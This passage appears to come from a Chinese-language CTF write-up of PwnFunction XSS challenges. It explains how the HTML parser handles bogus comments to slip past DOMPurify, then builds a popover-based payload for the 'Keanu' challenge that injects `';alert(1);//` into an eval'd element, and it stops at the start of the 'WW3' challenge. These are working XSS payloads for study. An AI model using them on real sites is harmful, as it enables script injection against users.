class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>c</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>cc</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>ccc</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x76F4;&#x5230;&#x8BE5;&#x72B6;&#x6001;&#x9047;&#x5230;&#x4E86;<code>&gt;</code>&#x4E3A;&#x6B62;&#xFF0C;&#x56DE;&#x5230; data state&#x3002;&#x6CE8;&#x610F;&#x8FD9;&#x4E2A; Bogus comment state &#x89E3;&#x6790;&#x5230;<code>&gt;</code>&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x56DE;&#x5230; data state&#xFF0C;&#x4E5F;&#x5C31;&#x662F; HTML parser &#x6700;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63D2;&#x5165; HTML &#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>&lt;?&gt;&lt;svg onload=alert()&gt;</code>&#x65F6;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E8C;&#x6B65;<code>pwnme.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x5019; HTML parser &#x89E3;&#x6790;&#x4E0E;&#x6211;&#x4EEC;&#x5728; Easy Version &#x5206;&#x6790;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x6709;&#x9047;&#x5230;<code>--&gt;</code>&#x7684;&#x65F6;&#x5019;&#x7ED3;&#x675F; Comment State &#x76F8;&#x5173;&#x72B6;&#x6001;&#x56DE;&#x5230; data state&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86; XSS&#x3002;</p><h2 id="Keanu"><a href="#Keanu" class="headerlink" title="Keanu"></a>Keanu</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">number</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">number</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcome&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-sm&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;DM @PwnFunction&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">data-trigger</span>=<span class="hljs-string">&quot;hover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;</span>&gt;</span>Solved it?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Input */</span></span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> number = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;number&apos;</span>) || <span class="hljs-string">&quot;7&quot;</span>)[<span class="hljs-number">0</span>],</span></span><br><span class="line"><span class="hljs-actionscript">        name = DOMPurify.sanitize(<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;name&apos;</span>), { SAFE_FOR_JQUERY: <span class="hljs-literal">true</span> });</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;number#number&apos;</span>).html(number);</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#welcome&apos;</span>).html(<span class="hljs-string">`Welcome &lt;b&gt;<span class="hljs-subst">${name || <span class="hljs-string">&quot;Mr. Wick&quot;</span>}</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Greet */</span></span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;show&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;hide&apos;</span>)</span></span><br><span class="line">    }, 2000)</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> magicNumber = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> number = <span class="hljs-built_in">eval</span>($(<span class="hljs-string">&apos;number#number&apos;</span>).html());</span></span><br><span class="line">    if (magicNumber === number) {</span><br><span class="line"><span class="hljs-actionscript">        alert(<span class="hljs-string">&quot;You&apos;re Breathtaking!&quot;</span>)</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x672C;&#x9898;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x4E86;&#x56DB;&#x4E2A; js &#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.4.1.slim.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x989D;&#x5916;&#x7ED9;&#x6211;&#x4EEC;&#x589E;&#x52A0;&#x7684;&#x8FD9;&#x51E0;&#x4E2A; js &#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x8FD9;&#x9053;&#x9898;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x7684;&#x5DE5;&#x5177;&#x4E86;&#x3002;</p><p>Purify.js &#x662F;&#x4E00;&#x4E2A; XSS WAF&#xFF0C;Popper.js&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x63D0;&#x793A;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x9898;&#x76EE;&#x4E2D;&#x4E5F;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F7F;&#x7528; popper &#x7684;&#x4F8B;&#x5B50;&#xFF0C;Jqeury.js &#x4E0E; Bootstrap &#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; name &#x53C2;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F; number &#x53C2;&#x6570;&#x3002;&#x7136;&#x800C; number &#x53C2;&#x6570;&#x6211;&#x4EEC;&#x5374;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4F4D;&#xFF0C;&#x800C; name &#x53C2;&#x6570;&#x867D;&#x7136;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x53EF;&#x63A7;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x7ECF;&#x8FC7; XSS WAF &#x8FC7;&#x6EE4;&#x3002;&#x867D;&#x7136;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x4E9B;&#x5229;&#x7528; mxss bypass Domprify &#x7684;&#x4E8B;&#x4F8B;&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x662F;&#x5728; 2.0 &#x5DE6;&#x53F3;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; 2.0.7 &#x53C8;&#x662F;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x662F;&#x4EC0;&#x4E48;&#x65B0;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x5426;&#x5219; number &#x53C2;&#x6570;&#x4E0E;&#x6700;&#x540E;&#x7684; <code>eval($(&quot;number#number&quot;).html());</code> &#x5C31;&#x6CA1;&#x7528;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x7528;&#x4E0A;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x80FD;&#x7528;&#x5230;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>eval($(&quot;number#number&quot;).html())</code>&#x8FDB;&#x884C; XSS &#xFF0C;&#x800C; number &#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x53EA;&#x6709;&#x4E00;&#x4F4D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x5F97;&#x60F3;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x529E;&#x6CD5;&#x6DFB;&#x52A0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; <a href="https://getbootstrap.com/docs/4.0/components/popovers" target="_blank" rel="noopener">popper document</a> &#x7ED3;&#x5408;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x90A3;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C8C;&#x4F3C;&#x8FD9;&#x4E2A; popper.js &#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x6DFB;&#x52A0;&#x65B0;&#x5185;&#x5BB9;&#x6761;&#x4EF6;&#xFF0C;&#x800C;&#x5728;&#x6587;&#x6863; <a href="https://getbootstrap.com/docs/4.0/components/popovers/#options" target="_blank" rel="noopener">options</a> &#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5230;&#x6709;&#x4E00;&#x4E9B;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x5173;&#x6CE8;&#x7684;&#x53C2;&#x6570;&#xFF1A;</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string | element | false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: &apos;body&apos;</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string | element | function</td><td>&#x2018;&#x2019;</td><td>Default content value if <code>data-content</code> attribute isn&#x2019;t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x6587;&#x6863;&#x77E5;&#x9053;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>data-container</code>&#x6765;&#x63A7;&#x5236; popover &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;<code>data-content</code>&#x6765;&#x63A7;&#x5236;&#x5185;&#x5BB9;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#x628A;&#x8FD9;&#x4E2A; popover &#x5F04;&#x5230; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x5462;&#xFF1F;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x5982;&#x4E0B; payload &#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5229;&#x7528;&#x9898;&#x76EE;&#x4E2D;&#x539F;&#x6709;&#x7684;<code>$(&quot;#keanu&quot;).popover(&quot;show&quot;);</code>&#x6765;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x7684; popover &#xFF0C;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x5148;&#x6CE8;&#x91CA;&#x6389;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#x7684;&#x5EF6;&#x8FDF;&#x5173;&#x95ED;&#x7684;&#x529F;&#x80FD;&#x4EE5;&#x4FBF;&#x4E8E;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png" alt></p><p>&#x5C3D;&#x7BA1; eval &#x6267;&#x884C;&#x51FA;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x786E;&#x5B9E;&#x88AB;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x4E86;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x5185;&#x5BB9;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover fade bs-popover-right show&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;popover238474&quot;</span> <span class="hljs-attr">x-placement</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arrow&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-header&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-body&quot;</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x5185;&#x5BB9;:<code>7&lt;template&gt;hello&lt;/template&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F; 7 &#x4E0E; hello &#xFF0C;<code>&lt;template&gt;</code>&#x5C31;&#x662F; popper.js &#x5B9E;&#x73B0;&#x7684; popover &#x529F;&#x80FD;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x6CE8;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x5982;&#x4F55;&#x5728;<code>$str=&quot;$1&lt;template&gt;$any&lt;/template&gt;&quot;;eval($str);</code>&#x5F53;&#x4E2D;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x5230;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x7B54;&#x6848;&#x5DF2;&#x7ECF;&#x547C;&#x4E4B;&#x6B32;&#x51FA;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x662F;&#x5728;<code>eval</code>&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7B2C;&#x4E00;&#x4F4D;&#x4E3A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x7531;&#x4E8E;&#x4E2D;&#x95F4;<code>$any</code>&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#xFF0C;&#x540E;&#x9762;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x5C06;<code>&lt;template&gt;</code>&#x53D8;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;<code>//</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;<code>&lt;/template&gt;</code>&#x5373;&#x53EF;&#xFF0C;&#x6574;&#x4E2A; payload &#x5373;&#x662F;<code>&apos;&lt;tamplate&gt;&apos;;alert();//&lt;/tamplate&gt;</code>&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FD9;&#x4E48;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;&apos;;alert(1);//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5373;&#x53EF;&#x5B9E;&#x73B0; XSS&#xFF0C;&#x6240;&#x4EE5; payload:</p><p></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">number</span>=&apos;&amp;name=&lt;button id<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;keanu&quot;</span> data-toggle<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;popover&quot;</span> data-container<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;%23number&quot;</span> data-content<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;&apos;%3Balert(1)%3B%2F%2F&quot;</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png" alt></p><h2 id="WW3"><a href="#WW3" class="headerlink" title="WW3"></a>WW3</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Meme Code<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;meme-code&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;notify&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Utils */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function">(<span class="hljs-params">dirty</span>) =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&apos;&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">        return (`<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> url(<span 